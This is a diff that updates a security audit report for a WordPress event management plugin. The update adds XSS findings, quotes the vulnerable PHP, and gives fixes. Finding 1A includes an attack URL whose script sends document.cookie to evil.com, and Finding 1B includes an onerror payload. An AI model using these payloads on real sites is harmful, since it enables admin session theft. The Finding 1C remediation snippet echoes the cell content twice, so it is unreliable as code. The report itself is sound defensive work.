@@ -1,23 +1,26 @@
 # Security Review Report – WordPress Event Manager Plugin
 
-**Review Date:** January 21, 2026  
+**Review Date:** January 22, 2026  
 **Plugin Version:** 3.12.8  
 **Reviewed By:** Senior WordPress Security Auditor  
-**Scope:** Comprehensive security assessment of custom WordPress event management plugin
+**Scope:** Comprehensive security assessment of custom WordPress event management plugin  
+**Review Status:** Updated - Complete code review against main branch
 
 ---
 
 ## 1. Executive Summary
 
-### Overall Security Posture: **MEDIUM RISK**
+### Overall Security Posture: **HIGH RISK**
 
-The Event Manager plugin demonstrates some good security practices including the use of dependency injection, service abstractions, and capability-based access control. However, several critical vulnerabilities and security weaknesses were identified that require immediate attention.
+The Event Manager plugin demonstrates some good security practices including the use of dependency injection, service abstractions, and capability-based access control. However, **multiple critical vulnerabilities** were identified that pose immediate security risks and require urgent remediation before production deployment.
 
 ### Key Findings Summary
 
-**Critical Issues (3):**
+**Critical Issues (5):**
+- **Multiple Stored XSS vulnerabilities** in admin table columns (3 separate instances)
+- **XSS in post status filter** - unsanitized $_GET output in HTML
 - Missing input validation and sanitization for user-submitted organization data
-- Lack of output escaping in admin table columns (XSS vulnerability)
+- **XSS in term name links** - unescaped URLs and term names
 - No explicit CSRF protection validation in custom ACF save actions
 
 **High Issues (4):**
@@ -35,9 +38,10 @@ The Event Manager plugin demonstrates some good security practices including the
 
 ### Most Critical Vulnerabilities
 
-1. **Stored Cross-Site Scripting (XSS)** - Output escaping missing in table columns
-2. **Improper Input Validation** - User-controlled data stored without validation
-3. **Missing CSRF Protection** - Custom form handlers lack nonce validation
+1. **Multiple Stored Cross-Site Scripting (XSS)** - Output escaping missing in 3+ locations
+2. **Reflected XSS in Admin Filter** - Unsanitized $_GET['post_status'] output
+3. **Improper Input Validation** - User-controlled data stored without validation
+4. **Missing CSRF Protection** - Custom form handlers lack nonce validation
 
 ---
 
@@ -164,6 +168,173 @@ private function sanitizeValue(mixed $value): string
     return esc_html((string) $value);
 }
 ```
+
+---
+
+#### Finding 1A: Reflected XSS in Post Status Filter
+
+**Severity:** Critical  
+**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)  
+**OWASP:** A03:2021 – Injection
+
+**Description:**  
+The `EventPostStatusFilter::outputFilterMarkup()` method directly outputs user input from `$_GET['post_status']` into HTML attributes without sanitization or escaping. This creates a reflected XSS vulnerability in the WordPress admin interface.
+
+**Affected Components:**
+- `/source/php/PostTableFilters/EventPostStatusFilter.php` (lines 27, 32, 35-36)
+
+**Vulnerable Code:**
+```php
+public function outputFilterMarkup(string $postType): void
+{
+    // ...
+    $selectedValue = $_GET['post_status'] ?? 'any';  // NO SANITIZATION
+    // ...
+    echo '<option value="any" ' . ($selectedValue === 'any' ? 'selected' : '') . '>Any status</option>';
+    
+    foreach ($statuses as $status => $label) {
+        echo '<option value="' . $status . '" ' . ($selectedValue === $status ? 'selected' : '') . '>'
+            . $label . '</option>';  // $selectedValue used in comparison but not escaped
+    }
+}
+```
+
+**Why This Matters:**  
+Reflected XSS in admin panels can be exploited through phishing attacks:
+- Attacker sends admin user a crafted link
+- Malicious JavaScript executes in admin context
+- Can lead to session hijacking, privilege escalation, site takeover
+
+**Attack Scenario:**  
+```
+https://site.com/wp-admin/edit.php?post_type=event&post_status="><script>fetch('https://evil.com/?cookie='+document.cookie)</script>
+```
+
+**Proof of Concept (Conceptual):**
+When an admin clicks this link, the unsanitized value is inserted into the HTML, breaking out of the attribute context and executing JavaScript.
+
+**Remediation:**
+```php
+public function outputFilterMarkup(string $postType): void
+{
+    if ($postType !== "event") {
+        return;
+    }
+
+    // Sanitize user input
+    $selectedValue = sanitize_text_field($_GET['post_status'] ?? 'any');
+    $statuses      = $this->wpService->getPostStatuses();
+    unset($statuses['private']);
+
+    echo '<select name="post_status" id="post_status">';
+    echo '<option value="any" ' . selected($selectedValue, 'any', false) . '>Any status</option>';
+
+    foreach ($statuses as $status => $label) {
+        echo '<option value="' . esc_attr($status) . '" ' . selected($selectedValue, $status, false) . '>'
+            . esc_html($label) . '</option>';
+    }
+
+    echo '</select>';
+}
+```
+
+---
+
+#### Finding 1B: XSS in Term Name Links
+
+**Severity:** Critical  
+**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)  
+**OWASP:** A03:2021 – Injection
+
+**Description:**  
+The `TermNameCellContent::termToTermLink()` method outputs term names and URLs directly into HTML without escaping. This allows stored XSS through taxonomy terms.
+
+**Affected Components:**
+- `/source/php/PostTableColumns/ColumnCellContent/TermNameCellContent.php` (line 41)
+
+**Vulnerable Code:**
+```php
+private function termToTermLink(WP_Term $term): string
+{
+    $editUrl = $this->wpService->getEditTermLink($term, $term->taxonomy);
+    return "<a href=\"{$editUrl}\">{$term->name}</a>";  // NO ESCAPING
+}
+```
+
+**Why This Matters:**  
+Term names are user-controlled (organization names) and displayed in admin tables. Malicious JavaScript in term names executes when administrators view the events list.
+
+**Attack Scenario:**
+1. User creates organization with name: `<img src=x onerror=alert(document.cookie)>`
+2. Organization term stored in database
+3. Admin views events list
+4. Malicious script executes in admin context
+
+**Remediation:**
+```php
+private function termToTermLink(WP_Term $term): string
+{
+    $editUrl = $this->wpService->getEditTermLink($term, $term->taxonomy);
+    return sprintf(
+        '<a href="%s">%s</a>',
+        esc_url($editUrl),
+        esc_html($term->name)
+    );
+}
+```
+
+---
+
+#### Finding 1C: Unescaped Output in Table Manager
+
+**Severity:** Critical  
+**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)  
+**OWASP:** A03:2021 – Injection
+
+**Description:**  
+The `Manager::populateTableCells()` method directly echoes the result of `getCellContent()` without any escaping. All cell content implementations must therefore properly escape their output, but several do not (as documented in Findings 1, 1B).
+
+**Affected Components:**
+- `/source/php/PostTableColumns/Manager.php` (line 71)
+
+**Vulnerable Code:**
+```php
+public function populateTableCells(string $currentColumn): void
+{
+    foreach ($this->columns as $column) {
+        if ($currentColumn === $column->getIdentifier()) {
+            echo $column->getCellContent();  // Direct echo without escaping
+        }
+    }
+}
+```
+
+**Why This Matters:**  
+This is a systemic issue - the Manager trusts all cell content providers to escape their output. This violates defense-in-depth principles and creates a fragile security model.
+
+**Remediation Strategy:**
+
+**Option 1 - Fix at the source (each cell content class):**
+Ensure all `getCellContent()` implementations return properly escaped HTML (already recommended in Findings 1, 1A, 1B).
+
+**Option 2 - Add escaping at Manager level (defense-in-depth):**
+```php
+public function populateTableCells(string $currentColumn): void
+{
+    foreach ($this->columns as $column) {
+        if ($currentColumn === $column->getIdentifier()) {
+            // Option A: Escape everything (may double-escape if content already has HTML)
+            echo wp_kses_post($column->getCellContent());
+            
+            // Option B: Require interface contract that content is pre-escaped
+            // and add phpDoc
+            echo $column->getCellContent(); // Assumes content is already escaped
+        }
+    }
+}
+```
+
+**Recommendation:** Implement both options for defense-in-depth.
 
 ---
 
@@ -687,19 +858,27 @@ public function setMessage(string $message): void
 
 ## 4. Recommendations & Remediation Priority
 
-### Immediate Actions (Within 24-48 Hours)
+### Immediate Actions (Within 24-48 Hours) - CRITICAL
 
-1. **Fix XSS in Admin Tables** (Finding 1)
-   - Add `esc_html()` to all output in table columns
+1. **Fix ALL XSS Vulnerabilities** (Findings 1, 1A, 1B, 1C)
+   - Add `esc_html()` to MetaStringCellContent and NestedMetaStringCellContent output
+   - Add `sanitize_text_field()` to EventPostStatusFilter for $_GET['post_status']
+   - Add `esc_url()` and `esc_html()` to TermNameCellContent links
    - Review all admin display code for missing escaping
+   - **Impact:** Prevents admin account compromise via XSS
 
 2. **Add Input Validation** (Finding 2)
    - Implement sanitization functions for all organization fields
-   - Validate email, URL, phone formats
+   - Validate email format with `is_email()`
+   - Validate URL format with `filter_var()`
+   - Validate phone format with regex
+   - **Impact:** Prevents malicious data injection
 
 3. **Add CSRF Protection** (Finding 3)
-   - Verify nonces in ACF save actions
-   - Add capability checks
+   - Verify nonces in ACF save actions with `wp_verify_nonce()`
+   - Add capability checks with `current_user_can()`
+   - Protect against autosave/revision hooks
+   - **Impact:** Prevents unauthorized data modification
 
 ### Short-Term Actions (Within 1 Week)
 
@@ -903,9 +1082,9 @@ public function setMessage(string $message): void
 
 ### OWASP Top 10 2021
 
-- [x] **A01 - Broken Access Control**: Partial (capability system exists, but gaps)
+- [ ] **A01 - Broken Access Control**: Partial (capability system exists, but CSRF gaps)
 - [ ] **A02 - Cryptographic Failures**: Not addressed (no encryption for sensitive data)
-- [ ] **A03 - Injection**: Critical issues found (XSS, lack of validation)
+- [ ] **A03 - Injection**: **CRITICAL FAILURES** (Multiple XSS, lack of input validation)
 - [ ] **A04 - Insecure Design**: Issues found (no rate limiting, spam protection)
 - [x] **A05 - Security Misconfiguration**: Acceptable (standard WordPress config)
 - [x] **A06 - Vulnerable Components**: Acceptable (dependencies managed)
@@ -916,58 +1095,81 @@ public function setMessage(string $message): void
 
 ### WordPress Coding Standards
 
-- [x] **Sanitization**: Partially implemented
-- [ ] **Escaping**: Missing in critical areas
-- [ ] **Nonce Verification**: Missing in custom actions
-- [x] **Capability Checks**: Implemented
-- [ ] **Data Validation**: Insufficient
+- [ ] **Sanitization**: Partially implemented (CRITICAL GAPS)
+- [ ] **Escaping**: **CRITICAL FAILURES** (Missing in 4+ locations)
+- [ ] **Nonce Verification**: **CRITICAL FAILURE** (Missing in custom actions)
+- [x] **Capability Checks**: Implemented (Good)
+- [ ] **Data Validation**: **CRITICAL FAILURE** (Insufficient)
 
 ---
 
 ## 9. Summary of Remediation Priorities
 
-### Critical Priority (Fix Immediately)
-1. Add output escaping to prevent XSS
-2. Implement input validation for organization data
-3. Add CSRF protection to save actions
+### Critical Priority (Fix Immediately - Within 24-48 Hours)
+1. **Fix Stored XSS in MetaStringCellContent** (Finding 1)
+2. **Fix Reflected XSS in EventPostStatusFilter** (Finding 1A) 
+3. **Fix Stored XSS in TermNameCellContent** (Finding 1B)
+4. **Review/Fix XSS in Table Manager** (Finding 1C)
+5. **Implement input validation for organization data** (Finding 2)
+6. **Add CSRF protection to save actions** (Finding 3)
 
 ### High Priority (Fix This Week)
-4. Implement rate limiting
-5. Add email/URL/phone validation
-6. Implement spam/bot protection
-7. Improve error handling
+7. Implement rate limiting (Finding 4)
+8. Add email/URL/phone validation (Finding 5)
+9. Implement spam/bot protection (Finding 6)
+10. Improve error handling (Finding 7)
 
 ### Medium Priority (Fix This Month)
-8. Enhance file upload security
-9. Add explicit REST permissions
-10. Implement GDPR compliance
-11. Sanitize taxonomy seeds
-12. Sanitize email notifications
+11. Enhance file upload security (Finding 8)
+12. Add explicit REST permissions (Finding 9)
+13. Implement GDPR compliance (Finding 10)
+14. Sanitize taxonomy seeds (Finding 11)
+15. Sanitize email notifications (Finding 12)
 
 ---
 
 ## 10. Conclusion
 
-The Event Manager plugin has a solid foundation with good architectural practices, but requires immediate attention to critical security vulnerabilities. The most urgent issues are:
+The Event Manager plugin has a solid foundation with good architectural practices, but requires **immediate attention to multiple critical security vulnerabilities**. The most urgent issues are:
 
-1. **Cross-Site Scripting (XSS)** vulnerabilities in admin tables
+1. **Multiple Cross-Site Scripting (XSS)** vulnerabilities in admin interface (4 separate instances)
+   - Stored XSS in table cell content (MetaStringCellContent, NestedMetaStringCellContent)
+   - Reflected XSS in post status filter ($_GET parameter)
+   - Stored XSS in term name links (unescaped organization names)
+   - Systemic XSS risk in table manager output
+
 2. **Missing input validation** allowing malicious data storage
+   - No email format validation (email injection risk)
+   - No URL validation (XSS/phishing risk)
+   - No phone number format validation
+
 3. **Lack of CSRF protection** in custom form handlers
+   - No nonce verification in ACF save_post actions
+   - Missing capability checks
 
-Addressing these issues should be the top priority before deploying this plugin in a production environment. The recommended fixes are straightforward and align with WordPress coding standards.
+**These vulnerabilities are actively exploitable** and can lead to:
+- Complete administrator account compromise
+- Malicious code injection into WordPress admin
+- Database pollution with malicious content
+- Email spam/phishing campaigns
+- Unauthorized data modification
 
-**Overall Risk Assessment:** The plugin in its current state poses a **MEDIUM to HIGH security risk** for production deployment. With the recommended fixes implemented, the risk can be reduced to **LOW**.
+Addressing these issues should be the **top priority before deploying this plugin in ANY environment**. The recommended fixes are straightforward and align with WordPress coding standards.
 
-**Next Steps:**
-1. Implement critical fixes (Findings 1-3)
-2. Run automated security scanning
-3. Conduct penetration testing
-4. Re-assess security posture
-5. Deploy to production with monitoring
+**Overall Risk Assessment:** The plugin in its current state poses a **HIGH security risk** for ANY deployment. **Production deployment is NOT recommended** until all critical issues are resolved. With the recommended fixes implemented, the risk can be reduced to **LOW**.
+
+**Immediate Next Steps:**
+1. **STOP** - Do not deploy to production
+2. Implement all critical fixes (Findings 1, 1A, 1B, 1C, 2, 3) - estimated 8-16 hours
+3. Run automated security scanning (PHPStan, PHPCS with security rules)
+4. Conduct manual penetration testing of fixed code
+5. Re-assess security posture with updated code review
+6. Only then consider production deployment with monitoring
 
 ---
 
 **Report Prepared By:** Senior WordPress Security Auditor  
-**Date:** January 21, 2026  
-**Review Methodology:** Manual code review, threat modeling, OWASP guidelines, WordPress coding standards  
-**Tools Used:** Code inspection, static analysis, security pattern analysis
+**Date:** January 22, 2026 (Updated)  
+**Review Methodology:** Comprehensive manual code review, threat modeling, OWASP Top 10 2021, WordPress Coding Standards  
+**Tools Used:** Direct code inspection, grep pattern analysis, static analysis review, security architecture assessment  
+**Code Coverage:** Full plugin codebase review against main branch (commit d16915f)
